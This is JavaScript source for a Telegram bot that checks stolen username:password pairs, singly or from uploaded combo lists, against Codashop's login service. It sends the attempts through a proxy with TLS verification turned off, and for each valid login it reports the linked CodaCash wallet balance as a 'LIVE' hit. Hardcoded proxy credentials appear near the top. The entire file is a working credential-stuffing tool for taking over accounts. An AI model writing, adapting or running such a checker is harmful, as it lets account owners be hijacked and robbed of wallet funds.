process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0";

const { Telegraf } = require('telegraf');
const axios = require('axios');
const { HttpsProxyAgent } = require('https-proxy-agent');

const bot = new Telegraf(process.env.BOT_TOKEN);

// Proxy kamu (Pastikan saldo/kuota proxy masih ada)
const proxyUrl = 'http://8998c0d8430265a3c9ab:6b2739b4b177724e@gw.dataimpulse.com:823';
const proxyAgent = new HttpsProxyAgent(proxyUrl);

// Fungsi Pengecekan Akun
async function checkAccount(username, password) {
  try {
    const authPayload = {
      AuthFlow: "USER_PASSWORD_AUTH",
      ClientId: "437f3u0sfh7h0av5rlrrjdtmsb",
      AuthParameters: { USERNAME: username, PASSWORD: password },
      ClientMetadata: { country_code: "ph", lang_code: "en" }
    };

    const authReq = await axios.post("https://cognito-idp.ap-southeast-1.amazonaws.com/", authPayload, {
      headers: {
        "x-amz-target": "AWSCognitoIdentityProviderService.InitiateAuth",
        "Content-Type": "application/x-amz-json-1.1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
      },
      httpsAgent: proxyAgent,
      proxy: false, // Penting agar axios menggunakan httpsAgent
      validateStatus: () => true, // Agar tidak crash saat 400 Bad Request
      timeout: 8000 // Batasi 8 detik agar tidak kena timeout Vercel duluan
    });

    if (authReq.data && authReq.data.AuthenticationResult) {
      const idToken = authReq.data.AuthenticationResult.IdToken;

      const walletReq = await axios.get("https://wallet-api.codacash.com/user/wallet", {
        headers: {
          "Authorization": idToken,
          "x-country-code": "608",
          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        },
        httpsAgent: proxyAgent,
        proxy: false,
        validateStatus: () => true,
        timeout: 5000
      });

      const balance = walletReq.data?.data?.balanceAmount || 0;
      return { status: 'live', balance: balance };
    } else {
      const msg = authReq.data?.__type ? authReq.data.__type.replace('Exception', '') : 'Invalid';
      return { status: 'die', msg: msg };
    }
  } catch (error) {
    return { status: 'error', msg: 'Timeout/Proxy Error' };
  }
}

bot.start((ctx) => ctx.reply('RecnomPay Ready! Kirim /codashop user:pass atau upload .txt'));

bot.command('codashop', async (ctx) => {
  const text = ctx.message.text.split(' ')[1];
  if (!text || !text.includes(':')) return ctx.reply('Format: /codashop user:pass');

  const [user, pass] = text.split(':');
  const wait = await ctx.reply('⏳ Checking...');
  
  const res = await checkAccount(user, pass);
  if (res.status === 'live') {
    ctx.telegram.editMessageText(ctx.chat.id, wait.message_id, null, `✅ LIVE\nAcc: <code>${user}:${pass}</code>\nBal: ${res.balance}`, { parse_mode: 'HTML' });
  } else {
    ctx.telegram.editMessageText(ctx.chat.id, wait.message_id, null, `❌ DIE\nAcc: <code>${user}:${pass}</code>\nMsg: ${res.msg}`, { parse_mode: 'HTML' });
  }
});

bot.on('document', async (ctx) => {
  if (!ctx.message.document.file_name.endsWith('.txt')) return ctx.reply('Kirim file .txt!');

  const wait = await ctx.reply('📥 Memproses mass check... (Max 50 akun agar tidak timeout)');

  try {
    const fileLink = await ctx.telegram.getFileLink(ctx.message.document.file_id);
    const response = await axios.get(fileLink.href);
    const lines = response.data.split('\n').map(l => l.trim()).filter(l => l.includes(':')).slice(0, 50);

    let lives = [];
    let countDie = 0;

    // Proses secara paralel
    const results = await Promise.all(lines.map(async (line) => {
      const [u, p] = line.split(':');
      const r = await checkAccount(u, p);
      return { u, p, r };
    }));

    results.forEach(item => {
      if (item.r.status === 'live') lives.push(`${item.u}:${item.p} | Bal: ${item.r.balance}`);
      else countDie++;
    });

    let rekap = `<b>✅ HASIL MASS CHECK</b>\n━━━━━━━━━━━━━━\n`;
    rekap += lives.length > 0 ? `<code>${lives.join('\n')}</code>` : 'Tidak ada yang LIVE';
    rekap += `\n━━━━━━━━━━━━━━\nLIVE: ${lives.length} | DIE: ${countDie}`;

    ctx.telegram.editMessageText(ctx.chat.id, wait.message_id, null, rekap, { parse_mode: 'HTML' });
  } catch (err) {
    ctx.reply('Error memproses file.');
  }
});

// Handler Vercel
module.exports = async (req, res) => {
  if (req.method === 'POST') {
    await bot.handleUpdate(req.body, res);
  } else {
    res.status(200).send('Bot is running');
  }
};
